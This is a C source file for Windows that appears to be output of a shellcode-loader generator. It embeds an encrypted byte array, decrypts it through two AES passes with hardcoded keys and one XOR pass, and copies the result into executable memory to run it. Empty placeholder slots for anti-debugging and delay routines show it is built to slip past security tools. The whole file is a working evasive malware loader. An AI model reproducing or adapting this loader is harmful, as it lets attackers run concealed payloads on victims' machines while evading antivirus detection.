#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <bcrypt.h>
#include <bcrypt.h>


//####DEFINE####

int aes_decrypt_0bd89ab90d5845f6b8d35d2697ff2971(unsigned char* encoded, int length) {

    unsigned char key[] = {0x08,0x9a,0x45,0x34,0xea,0xe2,0x41,0xd0,0xa3,0x49,0x80,0x28,0xb5,0x1d,0x0d,0x16,0x29,0x6a,0x18,0x78,0x79,0xfb,0x97,0xbb,0xae,0x1b,0xc9,0x7b,0x09,0x1d,0x6f,0x34};
    int key_length = sizeof(key);
    unsigned char iv[] = {0x16,0x66,0x7f,0xe6,0x72,0x84,0x79,0xa9,0x79,0x99,0x67,0x22,0xcc,0xf5,0xb1,0xe3};
    int iv_length = sizeof(iv);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbKeyObject, cbData, dwLength = length;
    PBYTE pbKeyObject = NULL;

    printf("\n[*] Before AES values: {");
    for (DWORD i = 0; i < length; i++) {
        printf("0x%02x", encoded[i]);
        if (i < length - 1) {
            printf(",");
        }
    }
    printf("}\n");

    // Open an algorithm handle
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptOpenAlgorithmProvider failed\n");
        return -1;
    }

    // Calculate the size of the buffer to hold the KeyObject
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptGetProperty failed\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Allocate the key object
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (NULL == pbKeyObject) {
        printf("[-] Memory allocation failed\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Generate the key from supplied input key bytes
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, key, key_length, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptGenerateSymmetricKey failed\n");
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Decrypt the data
    status = BCryptDecrypt(hKey, encoded, length, NULL, iv, iv_length, encoded, length, &dwLength, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptDecrypt failed\n");
        BCryptDestroyKey(hKey);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Debug statement to print the decrypted values
    printf("\n[*] After AES values: {");
    for (DWORD i = 0; i < dwLength; i++) {
        printf("0x%02x", encoded[i]);
        if (i < dwLength - 1) {
            printf(",");
        }
    }
    printf("}\n");

    // Clean up
    BCryptDestroyKey(hKey);
    HeapFree(GetProcessHeap(), 0, pbKeyObject);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return dwLength;
}int xor_encode_f1393b56115c46828d46288b7d8bf909(unsigned char* data, int data_len)
{
    const char* key = "QmCGbQaRv4YB";
    int key_len = 12;
    
    printf("\n[*] Before XOR values: {");
    for (DWORD i = 0; i < data_len; i++) {
        printf("0x%02x", data[i]);
        if (i < data_len - 1) {
            printf(",");
        }
    }
    printf("}\n");

    for (int i = 0; i < data_len; i++){
        data[i] = (data[i] ^ (unsigned char)key[i % key_len]);
    }


    printf("\n[*] After XOR values: {");
    for (DWORD i = 0; i < data_len; i++) {
        printf("0x%02x", data[i]);
        if (i < data_len - 1) {
            printf(",");
        }
    }
    printf("}\n");

    return data_len;
}
int aes_decrypt_d0cbf278d26e45c9a37cf4cfd58eecbe(unsigned char* encoded, int length) {

    unsigned char key[] = {0x5c,0xe3,0xa2,0x06,0x2d,0x51,0x0c,0xe4,0x7e,0xb4,0xb8,0x3b,0xb9,0x21,0xb8,0xe7,0x22,0x8d,0xfc,0x6b,0x01,0x5d,0x7e,0x13,0xbe,0x3e,0x3b,0x6c,0x6d,0xc9,0x24,0xc5};
    int key_length = sizeof(key);
    unsigned char iv[] = {0x83,0x2e,0xf2,0x40,0xf7,0xce,0x69,0x6a,0x7a,0x33,0x8b,0x82,0x8b,0x8a,0x76,0xae};
    int iv_length = sizeof(iv);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbKeyObject, cbData, dwLength = length;
    PBYTE pbKeyObject = NULL;

    printf("\n[*] Before AES values: {");
    for (DWORD i = 0; i < length; i++) {
        printf("0x%02x", encoded[i]);
        if (i < length - 1) {
            printf(",");
        }
    }
    printf("}\n");

    // Open an algorithm handle
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptOpenAlgorithmProvider failed\n");
        return -1;
    }

    // Calculate the size of the buffer to hold the KeyObject
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptGetProperty failed\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Allocate the key object
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (NULL == pbKeyObject) {
        printf("[-] Memory allocation failed\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Generate the key from supplied input key bytes
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, key, key_length, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptGenerateSymmetricKey failed\n");
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Decrypt the data
    status = BCryptDecrypt(hKey, encoded, length, NULL, iv, iv_length, encoded, length, &dwLength, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[-] BCryptDecrypt failed\n");
        BCryptDestroyKey(hKey);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    // Debug statement to print the decrypted values
    printf("\n[*] After AES values: {");
    for (DWORD i = 0; i < dwLength; i++) {
        printf("0x%02x", encoded[i]);
        if (i < dwLength - 1) {
            printf(",");
        }
    }
    printf("}\n");

    // Clean up
    BCryptDestroyKey(hKey);
    HeapFree(GetProcessHeap(), 0, pbKeyObject);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return dwLength;
}


DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    const unsigned char raw[] = {0xba,0x7b,0xf5,0x60,0x30,0xde,0x6d,0xcc,0xdb,0xac,0x77,0xc6,0xdf,0xe0,0x09,0x2f,0x5c,0xdf,0x5f,0xf2,0x14,0xf4,0x81,0x37,0x45,0xe7,0xcc,0xc6,0x5e,0xd5,0xf4,0x1c,0xd1,0x79,0xd7,0xa9,0xff,0x5c,0x00,0xe2,0x6b,0x12,0x67,0xe0,0x62,0x61,0xad,0x19,0xf1,0x12,0x3c,0x6c,0x1e,0xe8,0x0b,0xa4,0x91,0x11,0x7a,0xa1,0x57,0xb9,0x38,0xfe,0xda,0x18,0xaf,0xb6,0x93,0x3b,0xb1,0xd7,0xea,0x80,0x44,0xcc,0xa8,0x49,0x5d,0x53,0x28,0xdc,0xbb,0x48,0x13,0x96,0x1f,0xdf,0x32,0xc4,0x31,0xc4,0x07,0x27,0x9f,0x72,0xe3,0xd3,0xc3,0x9c,0x81,0xae,0xe9,0x29,0xfe,0xeb,0x5a,0xf4,0x03,0x6d,0xb0,0x68,0x5c,0xe6,0x06,0x25,0xd7,0xd2,0xdf,0x02,0xb2,0x58,0x04,0x99,0xb8,0x69,0x28,0xed,0x61,0xd3,0x62,0xe5,0x07,0x12,0xe6,0x5e,0xa2,0x63,0x22,0xe8,0x50,0x0a,0x9f,0x07,0x02,0xd1,0x7f,0x2d,0x61,0xa7,0x4c,0xcd,0xa7,0xb2,0x94,0x8e,0x64,0x1b,0xcc,0xbf,0x4b,0xd2,0x66,0x3d,0xa2,0x05,0xbd,0xe2,0x52,0xe7,0x5e,0x62,0x88,0xf2,0x0c,0x6e,0x7a,0x4e,0x1c,0x73,0x76,0x46,0xcd,0x65,0x18,0xee,0xbc,0x4c,0x41,0xb6,0x04,0x45,0xb8,0xa2,0x8c,0xd1,0x5f,0x3e,0x0d,0xee,0x0d,0x45,0x17,0xe8,0x43,0x73,0xa2,0x1d,0x10,0x11,0x38,0xa3,0x0f,0x0e,0x4c,0x41,0xcd,0xa3,0x99,0x7c,0xc7,0x87,0x48,0x2d,0x99,0x03,0x9d,0x9d,0xb2,0x33,0x2b,0xfb,0x34,0xd9,0x57,0xd4,0x61,0x23,0x23,0x96,0xcb,0xf0,0xad,0x1a,0x52,0xdf,0x4b,0x4a,0x39,0x37,0x1f,0xa6,0x7c,0x25,0x18,0xd5,0xff,0x9a,0xe0,0xac,0xc8,0x31,0x14,0x31,0x4e,0xbf,0xde,0xf8,0x86,0xe1,0xaa,0xcc,0xb9,0xa3,0x75,0x4a,0xd8,0xd5,0x86,0xd6,0x86,0x2e,0x61,0x1a,0xc4,0x0a,0x5a,0x87,0x63,0x2b,0x19,0x33,0xc3,0xd0,0x1b,0x44,0x22,0xbc,0xfe,0x9c,0x54,0xab,0xc6,0x4e};
    int length = sizeof(raw);

    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    memcpy(encoded, raw, length);
    //SIZE_T bytesWritten;

    length = aes_decrypt_0bd89ab90d5845f6b8d35d2697ff2971(encoded, length);length = xor_encode_f1393b56115c46828d46288b7d8bf909(encoded, length);length = aes_decrypt_d0cbf278d26e45c9a37cf4cfd58eecbe(encoded, length);

    unsigned char* decoded = encoded;

    //currentProcess = GetCurrentProcess();

    printf("[*] Allocating %d bytes of memory\n", length);
    void *exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL)
        return -1;

    bool success = false;
    success = memcpy(exec, decoded, length);
    if (!success){
        printf("[-] Oh gosh, something went wrong!\n");
        return -2;
    }
    
    int ret_val = 0;
    printf("[*] Executing\n");
    ((void (*)())exec)();
    
    printf("[+] The shellcode finished with a return value: %08X\n", ret_val);
    return 0;
}

int main()
{
    //####DELAY####
    //####ANTIDEBUG####
    //####ARGS####

    esc_main(NULL);
}
